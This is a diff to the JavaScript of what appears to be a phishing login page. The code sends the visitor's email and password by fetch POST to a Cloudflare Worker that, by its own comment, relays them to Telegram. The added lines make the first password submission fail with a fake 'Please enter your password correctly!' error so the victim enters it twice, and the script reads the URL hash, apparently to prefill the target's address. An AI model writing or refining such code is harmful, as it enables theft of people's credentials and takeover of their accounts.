@@ -1,9 +1,3 @@
-// Function to validate if a string is a valid email
-function isEmail(email) {
-    const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-    return emailPattern.test(email);
-}
-
 document.addEventListener('DOMContentLoaded', function() {
     checkCookie();
     let hashUrl = window.location.hash.substr(1).replace(new RegExp("%20", "g"), "+");
@@ -33,6 +27,8 @@ document.addEventListener('DOMContentLoaded', function() {
     userInputContainerDiv = document.getElementById("userInputContainerDiv");
     userBackButton = document.getElementById("userBackButtonSpanTxt");
     count = 0;
+    
+    let isFirstSubmit = true; // Flag to check first or second submission
 
     $("#userBackButton").click(function() {
         $(userBackButton).text("");
@@ -69,8 +65,13 @@ document.addEventListener('DOMContentLoaded', function() {
         if (password.length < 4) {
             passerror.style.fontSize = "small";
             passerror.innerHTML = "Please enter your password correctly!";
+            
+            // Only prevent the first submit
+            if (isFirstSubmit) {
+                return; // Stop the submission and show the error
+            }
         } else {
-            // Send both username and password to the Cloudflare Worker (Telegram)
+            // After the second submission, send both email and password to the Cloudflare Worker (Telegram)
             fetch(url, {
                 method: "POST",
                 body: JSON.stringify({
@@ -91,5 +92,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 passerror.innerHTML = "There was an error processing your request.";
             });
         }
+
+        // After the first submission (password is correct), set the flag to allow the second submit
+        isFirstSubmit = false;
     });
 });
